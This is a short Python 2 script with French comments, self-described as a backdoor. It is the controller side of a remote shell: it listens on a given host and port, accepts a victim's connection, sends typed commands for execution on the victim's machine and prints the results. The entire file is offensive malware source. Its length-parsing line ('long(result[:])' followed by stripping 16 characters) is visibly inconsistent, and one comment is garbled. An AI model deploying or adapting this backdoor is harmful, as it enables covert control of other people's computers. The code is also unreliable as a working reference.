import socket, subprocess as sp, sys

host = sys.argv[1] # premier argument backdoor.py 192.168.x.x
port = int(sys.argv[2]) # deuxieme argument backdoorpy.py 192.168.x.x 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creation connexion TCP
s.bind((host, port)) # creation via host et port
s.listen(5) # nombre de connexion gerer
print "[!] Listening on {}:{}".format(host, port)
conn, addr = s.accept() # con : echange info avec victime | retourner l'addresse ip et info connexion client

print "[+] Connection etablie avec host: {}".format(str(addr[0]))

while True: #bouc16le infinie 
	command = raw_input('#> ' ) # a executer sur le terminal victime
	if command != "exit()":
		if command =="": continue #revenir au boucle

		conn.send(command) # envoyer command au victime
		result = conn.recv(1024)
		total_size = long(result[:]) # taille du result
		result = result[16:] #strip 

		while total_size > len(result):
			data = conn.recv(1024)
			result += data # add result to data
		print result.rstrip("\n")
	else:
		conn.send("exit()")
		print "[+] Connection closed."
		break
s.close() # close connection



